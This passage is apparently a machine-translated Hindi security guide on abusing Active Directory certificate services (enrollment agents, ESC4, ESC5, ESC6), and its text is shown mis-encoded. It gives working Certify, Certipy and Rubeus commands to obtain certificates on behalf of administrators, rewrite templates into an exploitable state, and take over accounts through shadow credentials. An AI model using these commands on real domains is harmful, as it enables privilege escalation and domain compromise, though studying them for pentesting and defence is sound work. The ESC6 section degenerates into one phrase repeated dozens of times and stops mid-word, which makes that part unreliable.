**тАЬрдЗрдиреНрд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯтАЭ** рдРрд╕реЗ рдПрдХ **рдЯреЗрдореНрдкреНрд▓реЗрдЯ** рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреВрд╕рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП CSR рдХреЛ-рд╕рд╛рдЗрди рдХрд░рддрд╛ рд╣реИ**ред рдлрд┐рд░ рдпрд╣ **рдХреЛ-рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП CSR** рдХреЛ рд╕реАрдП рдХреЛ рднреЗрдЬрддрд╛ рд╣реИ, рдЬреЛ рдПрдХ **рдЯреЗрдореНрдкреНрд▓реЗрдЯ** рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯрд░ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **тАЬрдХрд┐рд╕реА рджреВрд╕рд░реЗ рдХреЗ рд▓рд┐рдП рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**тАЭ, рдФрд░ рд╕реАрдП рдПрдХ **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЬреЛ тАЬрджреВрд╕рд░реЗтАЭ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рд╣реИ** рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╕рд╛рдж рджреЗрддрд╛ рд╣реИред

**рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ 1:**

* рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░реА рд╕реАрдП рджреНрд╡рд╛рд░рд╛ рдЗрдиреНрд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
* рдкреНрд░рдмрдВрдзрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛ рдЫреВрдЯ рджреА рдЧрдИ рд╣реИред
* рдЕрдзрд┐рдХреГрдд рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред
* рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХрд╛ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг рдЕрддреНрдпрдзрд┐рдХ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЗрдиреНрд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
* рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдореЗрдВ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдПрдЬреЗрдВрдЯ EKU рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреЛ рджреВрд╕рд░реЗ рдкреНрд░рдзрд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

**рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ 2:**

* рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░реА рд╕реАрдП рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЗрдиреНрд░реЛрд▓рдореЗрдВрдЯ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
* рдкреНрд░рдмрдВрдзрдХ рд╕реНрд╡реАрдХреГрддрд┐ рдХреЛ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХрд╛ рд╕реНрдХреАрдорд╛ рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ 1 рд╣реИ рдпрд╛ 2 рд╕реЗ рдЕрдзрд┐рдХ рд╣реИ, рдФрд░ рдпрд╣ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреЙрд▓рд┐рд╕реА рдЗрд╢реНрдпреВрдЕрдВрд╕ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдПрдЬреЗрдВрдЯ EKU рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
* рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдПрдХ EKU рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* рд╕реАрдП рдкрд░ рдЗрдиреНрд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рдмрдВрдз рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реИред

### рджреБрд░реБрдкрдпреЛрдЧ

рдЖрдк рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**Certify**](https://github.com/GhostPack/Certify) рдпрд╛ [**Certipy**](https://github.com/ly4k/Certipy) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЬрд┐рдиреНрд╣реЗрдВ **рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рдЙрди рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдореЗрдВ рдЬрд┐рдирдореЗрдВ рдПрдирд░реЛрд▓рдореЗрдВрдЯ **рдПрдЬреЗрдВрдЯреНрд╕** рдХреЛ рдирд╛рдорд╛рдВрдХрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рдФрд░ рдЬрд┐рдирдХреЗ рдкрдХреНрд╖ рдореЗрдВ рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЙрдиреНрд╣реЗрдВ рдЙрджреНрдпрдо CA рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ `certsrc.msc` **рд╕реНрдиреИрдк-рдЗрди** рдЦреЛрд▓рдХрд░, CA рдкрд░ **рджрд╛рдпрд╛рдБ рдХреНрд▓рд┐рдХ** рдХрд░рдХреЗ, **рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ, рдФрд░ рдлрд┐рд░ тАЬрдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕тАЭ рдЯреИрдм рдкрд░ **рдиреЗрд╡рд┐рдЧреЗрдЯ** рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рджрд░реНрдЬрдиреАрдп рд╣реИ рдХрд┐ CA рдХреЗ рд▓рд┐рдП **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд╕реЗрдЯрд┐рдВрдЧ тАЬ**рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рди рдХрд░реЗрдВ**тАЭ рд╣реИред рдЬрдм рдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ тАЬрдПрдирд░реЛрд▓рдореЗрдВрдЯ рдПрдЬреЗрдВрдЯреНрд╕ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░реЗрдВтАЭ рдкрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдкрд░ рднреА, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╡рд┐рдиреНрдпрд╛рд╕ рдЕрддреНрдпрдВрдд рдЕрдиреБрдореЛрджрдирд╢реАрд▓ рд░рд╣рддрд╛ рд╣реИред рдпрд╣ рд╕рднреА рдХреЛ рд╕рднреА рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдореЗрдВ рдирд╛рдорд╛рдВрдХрд┐рдд рд╣реЛрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХреЛрдИ рднреАред

## рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг - ESC4

### **рд╡реНрдпрд╛рдЦреНрдпрд╛**

**рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕** рдкрд░ **рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╡рд░рдг** рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рд╡рд┐рд╢рд┐рд╖реНрдЯ **AD рдореБрдЦреНрдп** рдХрд┐рд╕ рдкреНрд░рдорд╛рдгреЛрдВ рдХреЛ рдкрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВред

рдпрджрд┐ рдХрд┐рд╕реА **рд╣рдорд▓рд╛рд╡рд░** рдХреЛ **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реЛрддреА рд╣реИрдВ рдХрд┐ рд╡рд╣ рдПрдХ **рдЯреЗрдореНрдкрд▓реЗрдЯ** рдХреЛ **рдмрджрд▓** рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рдкреВрд░реНрд╡ рдЦрдВрдбреЛрдВ** рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╡рд░реНрдгрд┐рдд рдХрд┐рд╕реА рднреА **рд╢реЛрд╖рдгреАрдп рдЧрд▓рддрд┐рдпреЛрдВ** рдХреЛ **рд╕реНрдерд╛рдкрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдпреЛрдЧреНрдп рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* **рдорд╛рд▓рд┐рдХ:** рд╡рд╕реНрддреБ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдХреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХрд┐рд╕реА рднреА рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИред
* **рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг:** рд╡рд╕реНрддреБ рдкрд░ рдкреВрд░реНрдг рдЕрдзрд┐рдХрд╛рд░ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХрд┐рд╕реА рднреА рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИред
* **рд▓реЗрдЦрдирдорд╛рд▓рд┐рдХрд╛:** рд╡рд╕реНрддреБ рдХреЗ рдорд╛рд▓рд┐рдХ рдХреЛ рдмрджрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рдПрдХ рдореБрдЦреНрдп рд╣реЛред
* **рд▓реЗрдЦрди рдбреЗрдХрд▓:** рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдгреЛрдВ рдХреЛ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред
* **рд▓реЗрдЦрди рд╕рдВрдкрддреНрддрд┐:** рдХрд┐рд╕реА рднреА рд╡рд╕реНрддреБ рдЧреБрдгреЛрдВ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

### рджреБрд░реБрдкрдпреЛрдЧ

рдПрдХ рдкрд┐рдЫрд▓реЗ рдЬреИрд╕реЗ рдПрдХ privesc рдХрд╛ рдЙрджрд╛рд╣рд░рдг:

<figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>

ESC4 рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░ рд▓реЗрдЦрди рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрдиреЗ рдкрд░ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреА рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рд╕рд╕реЗ рдЯреЗрдореНрдкрд▓реЗрдЯ ESC1 рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдкреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рдЬреИрд╕рд╛ рдХрд┐ рд╣рдо рдКрдкрд░ рдХреЗ рдкрде рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдХреЗрд╡рд▓ `JOHNPC` рдХреЗ рдкрд╛рд╕ рдпреЗ рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╣рдорд╛рд░реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `JOHN` рдХреЗ рдкрд╛рд╕ `JOHNPC` рдХреЗ рд▓рд┐рдП рдирдИ `AddKeyCredentialLink` рдПрдЬ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рддрдХрдиреАрдХ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯреЛрдВ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ, рдореИрдВрдиреЗ рдЗрд╕ рд╣рдорд▓рд╛ рднреА рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рд╣реИ, рдЬрд┐рд╕реЗ [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣рд╛рдБ Certipy рдХреЗ `shadow auto` рдХрдорд╛рдВрдб рдХрд╛ рдПрдХ рдЫреЛрдЯрд╛ рд╕рд╛ рдЭрд▓рдХред
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** рдПрдХ рдПрдХрд▓ рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЗ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд░реВрдк рд╕реЗ, Certipy рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ **ESC1 рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдкрд┐рдд** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░реЗрдЧрд╛ред рд╣рдо **рд╣рдорд╛рд░реЗ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рдж рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд** рд╣реЛрдЧрд╛ред
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## рд╡рдВрд╢рд╛рдиреБрдЧрдд PKI рдСрдмреНрдЬреЗрдХреНрдЯ рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг - ESC5
### рд╡реНрдпрд╛рдЦреНрдпрд╛

рдЬреЛ рд╡реНрдпрд╛рдкрдХ рд╡реЗрдм рд╣реИ рдЬрд┐рд╕рдореЗрдВ ACL рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдмрдВрдзреЛрдВ рдХрд╛ рдЬрд╛рд▓ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдФрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рд╕реЗ рдЖрдЧреЗ рдХрдИ рд╡рд╕реНрддреБрдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рд╡реЗ рд╕рдореНрдкреВрд░реНрдг рдПрдбреА рд╕реАрдПрд╕ рдкреНрд░рдгрд╛рд▓реА рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ рд╡рд╕реНрддреБрдПрдВ, рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓ рд╕рдХрддреА рд╣реИрдВ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИрдВ:

* The AD computer object of the CA server, which may be compromised through mechanisms like S4U2Self or S4U2Proxy.
* The RPC/DCOM server of the CA server.
* Any descendant AD object or container within the specific container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. This path includes, but is not limited to, containers and objects such as the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, and the Enrollment Services Container.

The security of the PKI system can be compromised if a low-privileged attacker manages to gain control over any of these critical components.
## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

рд╡рд┐рд╖рдп [**CQure Academy рдкреЛрд╕реНрдЯ**](https://cqureacademy.com/blog/enhanced-key-usage) рдореЗрдВ рдЪрд░реНрдЪрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ **`EDITF_ATTRIBUTESUBJECTALTNAME2`** рдзреНрд╡рдЬ рдХреЗ рдкрд░рд┐рдгрд╛рдореЛрдВ рдкрд░ рдзреНрдпрд╛рди рджреЗрддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ Microsoft рджреНрд╡рд╛рд░рд╛ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдиреНрдпрд╛рд╕, рдЬрдм рдХреЛрдИ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рд╛рдзрд┐рдХрд░рдг (CA) рдкрд░ рд╕рдХреНрд░рд┐рдп рд╣реЛрддрд╛ рд╣реИ, рддреЛ **рдкреНрд░рдпреЛрдХреНрддрд╛-рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдорд╛рди** рдХреЛ **рд╡рд┐рд╖рдп рд╡реИрдХрд▓реНрдкрд┐рдХ рдирд╛рдо** рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ **рдХрд┐рд╕реА рднреА рдЕрдиреБрд░реЛрдз** рдореЗрдВ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ 